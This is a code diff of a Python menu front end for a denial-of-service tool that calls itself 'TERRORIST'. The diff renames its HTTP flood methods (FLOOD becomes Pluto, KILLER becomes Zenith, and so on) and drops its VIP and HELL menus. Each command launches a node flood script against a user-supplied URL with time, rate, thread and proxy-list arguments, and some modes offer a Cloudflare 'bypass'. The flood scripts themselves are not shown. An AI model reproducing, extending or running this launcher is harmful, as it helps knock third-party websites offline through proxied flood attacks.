@@ -207,11 +207,10 @@ def layer7():
                         ║              \033[32mWELCOME TO \033[33mTERRORIST\x1b[38;5;160m              ║
                         ║     \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHODS\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
                     ╔═══╩════════════════════════════════════════════════╩═══╗
-                    ║       ●  CHAOS   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  SPELL   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║ 
-                    ║       ●  HTTPS   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  CURSE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
-                    ║       ●  BROWSER [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]    ●  CF      [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
-                    ║       ●  HULK    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  404     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
-                    ║       ●  KILLER  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  None    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  PLUTO   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  POSEIDON[\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║ 
+                    ║       ●  GLAXIA  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  EREBUS  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  NEMESIS [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]    ●  INFERNO [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  NEXUS   [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]    ●  ZENITH  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                     ╚════════════════════════════════════════════════════════╝
 \033[0m""")
 
@@ -269,62 +268,6 @@ def layer4():
                     ╚════════════════════════════════════════════════════════╝
 \033[0m""")
 
-def vip():
-        Screen.wrapper(methods)
-        os.system('cls' if os.name == 'nt' else 'clear')
-        print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
-               ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
-               ║          \x1b[38;5;160m        ;:::::;       ;         OOOOOOOO                ║
-               ║          \x1b[38;5;160m       ,;::::::;     ;'         / OOOOOOO               ║
-               ║          \x1b[38;5;160m     ;::::::::██╗   ██╗██╗██████╗ / DOOOOOO             ║
-               ║          \x1b[38;5;160m   .';::::::::██║   ██║██║██╔══██╗     DOOOO            ║
-               ║          \x1b[38;5;160m  ,::::::;::::██║   ██║██║██████╔╝       DOOO           ║
-               ║          \x1b[38;5;160m ;`::::::`':::╚██╗ ██╔╝██║██╔═══╝         DOOO          ║
-               ║          \x1b[38;5;160m :`:::::::`;:::╚████╔╝:██║██║ /            DOOO         ║
-               ║          \x1b[38;5;160m ::`:::::::`;:::╚═══╝ ;╚═╝╚═╝/              DOO         ║
-               ║          \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO         ║
-               ║          \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO         ║
-               ║          \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO         ║
-               \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
-                    ════╦════════════════════════════════════════════════╦════
-                        ║              \033[32mWELCOME TO \033[33mTERRORIST\x1b[38;5;160m              ║
-                        ║     \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHODS\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
-                    ╔═══╩════════════════════════════════════════════════╩═══╗
-                    ║    ●  BOW        [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  FLOOD      [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
-                    ║    ●  HTTP-LOAD  [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  TLS-FLOOD  [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
-                    ║    ●  TLS        [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  UAM-CFL    [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
-                    ╚════════════════════════════════════════════════════════╝
-\033[0m""")
-
-# BETA METHODS
-
-def hell():
-        Screen.wrapper(methods)
-        os.system('cls' if os.name == 'nt' else 'clear')
-        print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
-               ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
-               ║          \x1b[38;5;160m        ;:::::;       ;         OOOOOOOO                ║
-               ║          \x1b[38;5;160m       ,;::::::;     ;'         / OOOOOOO               ║
-               ║          \x1b[38;5;160m     ;::::::::██╗   ██╗██╗██████╗ / DOOOOOO             ║
-               ║          \x1b[38;5;160m   .';::::::::██║   ██║██║██╔══██╗     DOOOO            ║
-               ║          \x1b[38;5;160m  ,::::::;::::██║   ██║██║██████╔╝       DOOO           ║
-               ║          \x1b[38;5;160m ;`::::::`':::╚██╗ ██╔╝██║██╔═══╝         DOOO          ║
-               ║          \x1b[38;5;160m :`:::::::`;:::╚████╔╝:██║██║ /            DOOO         ║
-               ║          \x1b[38;5;160m ::`:::::::`;:::╚═══╝ ;╚═╝╚═╝/              DOO         ║
-               ║          \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO         ║
-               ║          \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO         ║
-               ║          \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO         ║
-               \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
-                    ════╦════════════════════════════════════════════════╦════
-                        ║              \033[32mWELCOME TO \033[33mTERRORIST\x1b[38;5;160m              ║
-                        ║     \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHODS\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
-                    ╔═══╩════════════════════════════════════════════════╩═══╗
-                    ║    ●  PRIDE      [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  SLOTH      [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
-                    ║    ●  GLUTTONY   [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  Wrath      [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
-                    ║    ●  ENVY       [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  GREED      [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
-                    ║    ●  LUST       [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]                              ║
-                    ╚════════════════════════════════════════════════════════╝
-\033[0m""")
 
 def rules():
     Screen.wrapper(help)
@@ -412,10 +355,6 @@ def main():
                         os.system(f'python update.py')
                 if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
                         layer7()
-                if sinput == "vip" or sinput == "VIP" or sinput == "V1P" or sinput == "v1p":
-                        vip()
-                if sinput == "hell" or sinput == "HELL":
-                        hell()
                 if sinput == "tool" or sinput == "TOOL" or sinput == "TOOLS" or sinput == "tools":
                         tools()
                 if sinput == "layer4" or sinput == "LAYER4" or sinput == "l4" or sinput == "L4":
@@ -464,7 +403,7 @@ def main():
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTCP <ip> <port> <thread> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mTCP 1.1.1.1 80 10 120')
                 
-                elif sinput == "SPELL" or sinput == "spell":
+                elif sinput == "nexus" or sinput == "NEXUS":
                         try:
                                 mode = sin.split()[1]
                                 url = sin.split()[2]
@@ -472,47 +411,35 @@ def main():
                                 thread = sin.split()[4]
                                 Screen.wrapper(attack)
                                 os.system ("clear")
-                                os.system(f'cd L7 && node SPELL.js {mode} {url} proxy.txt {time} 10000 {thread}')  
+                                os.system(f'cd L7 && node Nexus.js {mode} {url} proxy.txt {time} 10000 {thread}')  
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mSPELL <GET/POST> <url> <time> <thread>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mSPELL GET example.com 120 10')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mNEXUS <GET/POST> <url> <time> <thread>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mNEXUS GET example.com 120 10')
                 
-                elif sinput == "BOW" or sinput == "bow":
+                elif sinput == "poseidon" or sinput == "POSEIDON": #BOW
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 Screen.wrapper(attack)
                                 os.system ("clear")
-                                os.system(f'cd VIP && node BOW {url} {time} 10 proxy.txt autorate')  
+                                os.system(f'cd L7 && node Poseidon {url} {time} 10 proxy.txt autorate')  
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mBOW <url> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mBOW https://example.com 120')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mPOSEIDON <url> <time>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mPOSEIDON https://example.com 120')
 
-                elif sinput == "TLS" or sinput == "tls":
+                elif sinput == "nemesis" or sinput == "NEMESIS":
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 rate = sin.split()[3]
                                 Screen.wrapper(attack)
                                 os.system ("clear")
-                                os.system(f'cd VIP && node TLS.js {url} {time} {rate} 10 proxy.txt')  
+                                os.system(f'cd L7 && node Nemesis.js {url} {time} {rate} 10 proxy.txt')  
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTLS <url> <time> <rate>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mBOW https://example.com 120 64')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mNEMESIS <url> <time> <rate>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mNEMESIS https://example.com 120 64')
                 
-                elif sinput == "BROWSER" or sinput == "browser":
-                        try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                req = sin.split()[3]
-                                Screen.wrapper(attack)
-                                os.system ("clear")
-                                os.system(f'cd L7 && node BROWSER.js {url} {time} {req}')  
-                        except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mBROWSER <url> <time> <requests>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mBROWSER https://example.com 120 10')
-                
-                elif sinput == "FLOOD" or sinput == "flood":
+                elif sinput == "pluto" or sinput == "PLUTO": #FLOOD
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
@@ -521,10 +448,10 @@ def main():
                                 mode = sin.split()[5]
                                 Screen.wrapper(attack)
                                 os.system ("clear")
-                                os.system(f'cd VIP && node FLOOD.js {url} {time} {rate} {thread} proxy.txt {mode}')
+                                os.system(f'cd L7 && node Pluto.js {url} {time} {rate} {thread} proxy.txt {mode}')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD <url> <time> <64-200> <12> <bypass/flood>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD https://example.com 120 64 12 bypass')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mPLUTO <url> <time> <64-200> <12> <bypass/flood>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mPLUTO https://example.com 120 64 12 bypass')
                  
                 elif sinput == "HOME" or sinput == "home":
                         try:
@@ -537,48 +464,26 @@ def main():
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHOME <ip> <port> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHOME 1.1.1.1 433')
 
-                elif sinput == "CURSE" or sinput == "curse":
+                elif sinput == "inferno" or sinput == "INFERNO":
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 rate = sin.split()[3]
                                 Screen.wrapper(attack)
-                                os.system(f'cd L7 && node CURSE.js {url} {time} {rate} 10 socks4.txt')
+                                os.system(f'cd L7 && node Inferno.js {url} {time} {rate} 10 socks4.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCURSE <url> <time> <rate>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mCURSE https://example.com 120 64')
-                
-                elif sinput == "HTTPS" or sinput == "https":
-                        try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                rate = sin.split()[3]
-                                thread = sin.split()[4]
-                                Screen.wrapper(attack)
-                                os.system(f'cd L7 && node HTTPS.js {url} {time} {rate} {thread} proxy.txt')
-                        except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHTTPS <url> <time> <rate> <threads>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHTTPS https://example.com 120 64 10 ')
-                        
-                elif sinput == "CHAOS" or sinput == "chaos":
-                        try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                Screen.wrapper(attack)
-                                os.system(f'cd L7 && node CHAOS.js {url} {time} 250 8 proxy.txt')
-                        except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCHAOS <url> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mCHAOS https://example.com 120')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mINFERNO <url> <time> <rate>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mINFERNO https://example.com 120 64')
 
-                elif sinput == "KILLER" or sinput == "killer":
+                elif sinput == "zenith" or sinput == "ZENITH": # KILLER
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 Screen.wrapper(attack)
-                                os.system(f'cd L7 && node KILLER.js {url} {time} 100 10 proxy.txt')
+                                os.system(f'cd L7 && node Zenith.js {url} {time} 100 10 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mKILLER <url> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mKILLER https://example.com 120')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mZENITH <url> <time>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mZENITH https://example.com 120')
     
                 elif sinput == "HULK" or sinput == "hulk":
                         try:
@@ -590,25 +495,15 @@ def main():
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHULK <url> <GET/POST>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHULK https://example.com GET')
 
-                elif sinput == "404" or sinput == "404":
+                elif sinput == "erebus" or sinput == "EREBUS": 
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 Screen.wrapper(attack)
-                                os.system(f'cd L7 && node 404.js {url} {time} 80 10 proxy.txt')
+                                os.system(f'cd L7 && node Erebus.js {url} {time} 80 10 proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255m404 <url> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255m404 https://example.com 120')
-                                
-                elif sinput == "CF" or sinput == "cf":
-                        try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                Screen.wrapper(attack)
-                                os.system(f'cd L7 && node CF.js {url} {time} 64 10 proxy.txt')
-                        except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCF <url> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mCF https://example.com 120')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mEREBUS <url> <time>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mEREBUS https://example.com 120')
 
                 elif sinput == "paping" or sinput == "PAPING":
                         try:
@@ -619,38 +514,6 @@ def main():
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mPAPING <ip> <port>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mPAPING 1.1.1.1 80')
-        
-                elif sinput == "HTTP-STRESS" or sinput == "http-stress":
-                        try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                Screen.wrapper(attack)
-                                os.system(f'cd L7 && node STRESS.js {url} {time} 250 8 proxy.txt')
-                        except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHTTP-STRESS <url> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHTTP-STRESS https://example.com 120')
-
-                elif sinput == "TLS-FLOOD" or sinput == "tls-flood":
-                        try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                requests = sin.split()[3]
-                                Screen.wrapper(attack)
-                                os.system(f'cd VIP && node TLS-FLOOD.js {url} {time} {requests} 10 proxy.txt')
-                        except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTLS-FLOOD <url> <time> <request per ip>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mTLS-FLOOD https://example.com 120 8')
-
-                elif sinput == "HTTP-LOAD" or sinput == "http-load":
-                        try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                Screen.wrapper(attack)
-                                os.system(f'cd VIP && node HTTP-LOAD.js {url} {time} 64 10 proxy.txt')
-                                os.system ("clear")
-                        except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHTTP-LOAD <url> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHTTP-LOAD https://example.com 120')
 
                 elif sinput == "STRESS" or sinput == "stress":
                         try:
@@ -663,12 +526,12 @@ def main():
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mSTRESS <url> <port> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mSTRESS https://example.com 443 120')
 
-                elif sinput == "UAMCFL" or sinput == "uamcfl":
+                elif sinput == "glaxia" or sinput == "GLAXIA": #UAMCFL
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 Screen.wrapper(attack)
-                                os.system(f'cd VIP && node UAMCFL.js {url} {time} 64 10 proxy.txt')
+                                os.system(f'cd L7 && node Glaxia.js {url} {time} 64 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mUAMCFL <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mUAMCFL https://example.com 120')
@@ -676,7 +539,7 @@ def main():
                 else:
                         try:
                                 cmd=sin.split()[0]
-                                excluded_keywords = ["cls", "help", "HELP", "RULES", "rules", "rule", "RULE", "kill", "KILL", "exit", "EXIT", "l4", "L4", "layer4", "LAYER4", "l7", "L7", "layer7", "LAYER7", "tool", "tools", "TOOL", "TOOLS", "shut", "SHUT", "vip", "VIP", "V1P", "v1p", "scrape", "checkproxy", "update", "UPDATE", "check", "hell", "HELL"]
+                                excluded_keywords = ["cls", "help", "HELP", "RULES", "rules", "rule", "RULE", "kill", "KILL", "exit", "EXIT", "l4", "L4", "layer4", "LAYER4", "l7", "L7", "layer7", "LAYER7", "tool", "tools", "TOOL", "TOOLS", "shut", "SHUT", "scrape", "SCRAPE", "checkproxy", "update", "UPDATE", "check"]
                                 
                                 if cmd not in excluded_keywords:
                                   print(" \x1b[38;5;160m[ ! ] Command : [ \x1b[38;5;255m"+cmd+" \x1b[38;5;160m] Not Found\n [ > ] Use '\x1b[38;5;255mhelp\x1b[38;5;160m' to see all commands.")
